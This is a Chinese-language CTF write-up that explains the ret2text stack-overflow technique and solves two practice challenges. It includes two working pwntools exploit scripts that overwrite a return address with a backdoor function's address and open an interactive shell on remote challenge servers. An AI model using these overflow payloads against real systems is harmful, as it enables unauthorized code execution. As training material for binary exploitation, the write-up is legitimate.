---
title: Ret2text
date: 2019-05-22 14:18:00
categories: 
  - Pwn
tags:
  - Pwn
---

# Ret2text

## 原理

在 CTF 和二进制安全里，Ret2text 是一种非常经典的栈溢出利用手法。它的名字可以这样拆开理解：

- Ret：Return，代表 "返回地址"

- 2 / to：到、跳转到

- text：`.text` 段，存放程序机器指令的区域

简单说，Ret2text 就是利用栈溢出漏洞，将函数的返回地址篡改为程序 `.text` 段中已存在的合法代码，从而劫持控制流去执行这些代码来获取 shell

因为执行的代码是程序本来就有的，所以它不需要注入 Shellcode，也能绕过 NX 保护

## 实战案例

### 帮我取一个题目名称（Ret2text）

![](https://pic1.imgdb.cn/item/6a2c2a9879b3658c76e3c192.png)

没开金丝雀，`read` 函数读取大小为 64 字节

![](https://pic1.imgdb.cn/item/6a2b6d8e240596c6e205b4f6.png)

变量 `s` 距离 `r` 处是 `0x28` 个字节

![](https://pic1.imgdb.cn/item/6a2b6dba240596c6e205b507.png)

后门函数地址是 `0x0401162`

![](https://pic1.imgdb.cn/item/6a2b6df5240596c6e205b8f5.png)

```python
from pwn import *

p = process('./main')
p = remote('49.232.142.230', 11228)

p.sendafter("?",b'A' * 0x28 + p64(0x401162))
p.interactive()
```

### easy stack（Ret2text）

![](https://pic1.imgdb.cn/item/6a2c2ace79b3658c76e3c197.png)

没有金丝雀

![](https://pic1.imgdb.cn/item/6a2b7bcf240596c6e205ed2d.png)

后门函数地址

![](https://pic1.imgdb.cn/item/6a2b7c89240596c6e205f168.png)

`nc` 过去先看看回显什么

![](https://pic1.imgdb.cn/item/6a2b7dfa240596c6e205f5ed.png)

开局给了后门函数地址

![](https://pic1.imgdb.cn/item/6a2b7e19240596c6e205f5f6.png)

找到打印的第二句话的位置

![](https://pic1.imgdb.cn/item/6a2b7ea2240596c6e205f665.png)

观察变量 `s` 的栈布局

![](https://pic1.imgdb.cn/item/6a2b7ec9240596c6e205f67e.png)

离 `r` 处有 `0x88 + 0x4` 的距离，但是 `read` 函数给了 `0x100` 的长度，完全够溢出 

![](https://pic1.imgdb.cn/item/6a2b7ee3240596c6e205f6b2.png)

```python
from pwn import*
p = remote('49.232.142.230', 19539)

p.recvuntil('magic_address ') # 有空格
shell = int(p.recv(10),16)
log.info('Shell:\t' + hex(shell))

p.send(b'A' * 0x8C  + p32(shell))
p.interactive()
```